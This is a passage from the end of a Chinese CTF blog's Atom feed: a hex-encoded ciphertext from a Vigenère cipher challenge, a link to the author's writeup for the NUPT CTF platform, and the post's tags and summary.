class="line">F96DE8C227A259C87EE1DA2AED57C93FE5DA36ED4EC87EF2C63AAE5B9A7EFFD673BE4ACF7BE8923CAB1ECE7AF2DA3DA44FCF7AE29235A24C963FF0DF3CA3599A70E5DA36BF1ECE77F8DC34BE129A6CF4D126BF5B9A7CFEDF3EB850D37CF0C63AA2509A76FF9227A55B9A6FE3D720A850D97AB1DD35ED5FCE6BF0D138A84CC931B1F121B44ECE70F6C032BD56C33FF9D320ED5CDF7AFF9226BE5BDE3FF7DD21ED56CF71F5C036A94D963FF8D473A351CE3FE5DA3CB84DDB71F5C17FED51DC3FE8D732BF4D963FF3C727ED4AC87EF5DB27A451D47EFD9230BF47CA6BFEC12ABE4ADF72E29224A84CDF3FF5D720A459D47AF59232A35A9A7AE7D33FB85FCE7AF5923AA31EDB3FF7D33ABF52C33FF0D673A551D93FFCD33DA35BC831B1F43CBF1EDF67F0DF23A15B963FE5DA36ED68D378F4DC36BF5B9A7AFFD121B44ECE76FEDC73BE5DD27AFCD773BA5FC93FE5DA3CB859D26BB1C63CED5CDF3FE2D730B84CDF3FF7DD21ED5ADF7CF0D636BE1EDB79E5D721ED57CE3FE6D320ED57D469F4DC27A85A963FF3C727ED49DF3FFFDD24ED55D470E69E73AC50DE3FE5DA3ABE1EDF67F4C030A44DDF3FF5D73EA250C96BE3D327A84D963FE5DA32B91ED36BB1D132A31ED87AB1D021A255DF71B1C436BF479A7AF0C13AA14794</div></pre></td></tr></table></figure><p>详见 <a href="https://findneo.github.io/2017/10/nupt-vigenere/">南邮CTF平台 Vigenere writeup</a> 。</p>]]></content>
    
    <summary type="html">
    
      这是个不错的平台，学到了一些，也发现了更多需要深入学习的东西。
    
    </summary>
    
      <category term="writeup" scheme="https://findneo.github.io/categories/writeup/"/>
    
    
      <category term="ctf" scheme="https://findneo.github.io/tags/ctf/"/>
    
  </entry>
  
</feed>
